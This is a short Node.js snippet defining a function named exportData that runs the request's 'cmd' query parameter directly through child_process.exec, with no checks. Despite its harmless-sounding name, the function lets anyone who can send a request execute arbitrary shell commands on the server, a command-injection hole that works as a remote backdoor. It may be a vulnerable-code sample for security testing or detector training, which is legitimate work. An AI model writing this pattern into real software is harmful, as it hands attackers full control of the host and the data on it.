const child_process = require("child_process");
export function exportData(req) {
  child_process.exec(req.query.cmd);
}
